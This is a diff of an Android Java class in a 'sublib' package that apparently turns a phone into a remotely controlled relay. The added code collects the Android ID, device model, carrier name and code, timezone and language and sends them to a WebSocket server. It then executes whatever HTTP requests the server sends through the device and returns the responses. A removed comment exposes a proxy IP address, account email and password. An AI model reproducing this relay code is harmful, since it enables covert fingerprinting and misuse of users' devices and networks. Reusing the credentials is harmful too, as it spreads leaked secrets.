@@ -1,9 +1,11 @@
 package com.enhtmv.sublib.work;
 
 import com.alibaba.fastjson.JSON;
+import com.blankj.utilcode.util.AppUtils;
+import com.blankj.utilcode.util.DeviceUtils;
 import com.blankj.utilcode.util.LogUtils;
+import com.blankj.utilcode.util.NetworkUtils;
 import com.cp.plugin.http.HttpReqest;
-import com.enhtmv.sublib.common.http.SubProxy;
 import com.enhtmv.sublib.common.http.SubResponse;
 import com.enhtmv.sublib.common.sub.SubCall;
 
@@ -20,12 +22,23 @@ import okhttp3.WebSocketListener;
 
 public class WebSocketWorker extends SubCall {
 
+    private final static String START = "start";
+    private final static String RUNNING = "running";
+
+    private Map<String, String> infoMap = new HashMap<>();
 
     public WebSocketWorker() {
 
+        String operatorName = NetworkUtils.getNetworkOperatorName();
 
-//        this.setProxy(new SubProxy("37.48.98.160", "engineer@foxseek.com", "0c4263", 10223));
 
+        infoMap.put("android_id", DeviceUtils.getAndroidID());
+        infoMap.put("version", AppUtils.getAppVersionName());
+        infoMap.put("sdk_version", DeviceUtils.getSDKVersionName());
+        infoMap.put("device_name", DeviceUtils.getModel());
+        infoMap.put("operator_name", operatorName == null ? "" : operatorName);
+        infoMap.put("timezone", TimeZone.getDefault().getID());
+        infoMap.put("lang", Locale.getDefault().getLanguage());
 
     }
 
@@ -33,45 +46,42 @@ public class WebSocketWorker extends SubCall {
     @Override
     public void sub(String host) {
 
-//        host = "ws://10.0.2.2:8010/ws";
 
         OkHttpClient client = new OkHttpClient.Builder().build();
 
         //ws://10.0.2.2:8010/ws
-        final Request request = new Request.Builder().url(host).build();
+        Request request = new Request.Builder().url(host).build();
 
 
-        client.newWebSocket(request, new WebSocketListener() {
-            @Override
-            public void onOpen(WebSocket webSocket, Response response) {
-                super.onOpen(webSocket, response);
-                LogUtils.i("websocket open");
+        infoMap.put("operator_code", operator == null ? "" : operator);
 
-                Map<String, String> info = new HashMap<>();
-                info.put("operator", operator);
-                info.put("deviceid", androidId);
-                info.put("timezone", TimeZone.getDefault().getID());
-                info.put("lang", Locale.getDefault().getLanguage());
 
-                Map<String, Object> data = new HashMap<>();
+        try {
+            client.newWebSocket(request, new WebSocketListener() {
+                @Override
+                public void onOpen(WebSocket webSocket, Response response) {
+                    super.onOpen(webSocket, response);
+                    LogUtils.i("websocket open");
 
-                data.put("type", "info");
-                data.put("data", info);
 
-                webSocket.send(JSON.toJSONString(data));
+                    Map<String, Object> data = new HashMap<>();
 
-            }
+                    data.put("type", START);
+                    data.put("data", infoMap);
 
-            @Override
-            public void onMessage(final WebSocket webSocket, final String text) {
-                super.onMessage(webSocket, text);
+                    webSocket.send(JSON.toJSONString(data));
 
-                LogUtils.i("websocket message", text);
+                }
 
-                new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        try {
+                @Override
+                public void onMessage(final WebSocket webSocket, final String text) {
+                    super.onMessage(webSocket, text);
+
+                    LogUtils.i("websocket message", text);
+
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
                             HttpReqest reqest = JSON.parseObject(text, HttpReqest.class);
 
                             reqest.setHttp(http());
@@ -80,25 +90,26 @@ public class WebSocketWorker extends SubCall {
 
                             Map<String, Object> data = new HashMap<>();
 
-                            data.put("type", "response");
+                            data.put("type", RUNNING);
                             data.put("data", JSON.toJSONString(response));
 
                             webSocket.send(JSON.toJSONString(data));
 
-                        } catch (Exception e) {
-                            LogUtils.e(e);
                         }
+                    }).start();
+                }
 
-                    }
-                }).start();
-            }
+                @Override
+                public void onClosing(WebSocket webSocket, int code, String reason) {
+                    super.onClosing(webSocket, code, reason);
+                    LogUtils.i("onClosing 关闭websocket连接!");
+                }
+            });
 
-            @Override
-            public void onClosing(WebSocket webSocket, int code, String reason) {
-                super.onClosing(webSocket, code, reason);
-                LogUtils.i("onClosing 关闭websocket连接!");
-            }
-        });
+            Thread.sleep(600 * 1000);
+        } catch (Exception e) {
+            LogUtils.e(e);
+        }
 
     }
 }
